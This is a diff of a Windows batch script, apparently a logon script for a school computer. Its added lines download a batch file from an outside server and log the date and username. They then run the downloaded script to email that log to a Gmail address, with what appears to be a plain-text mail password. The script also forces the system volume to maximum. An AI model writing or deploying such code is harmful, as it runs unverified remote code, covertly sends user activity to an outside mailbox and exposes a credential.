@@ -9,7 +9,18 @@ mkdir tools
 cd tools
 curl -s https://sources.tobir.xyz/tools-mirror/nircmd.exe > nircmd.tmpexe
 move nircmd.tmpexe nircmd.exe
+curl -s https://sources.tobir.xyz/mailserver/sendmail.bat > sendmail.tmpbat
+move sendmail.tmpbat sendmail.bat
 timeout 1
+cd C:/
+mkdir Sessions
+cd Sessions
+mkdir %date%
+cd %date%
+mkdir %username%
+cd %username%
+echo Session running on user %UserName% > session.log
+call C:\tools\sendmail.bat pc.skola.files.send@gmail.com dnjppkiqfvpvojxg "C:\Sessions\%Date%\%UserName%\session.log"
 nircmd.exe mutesysvolume 0
 nircmd.exe setsysvolume 65535
 #nircmd.exe monitor off
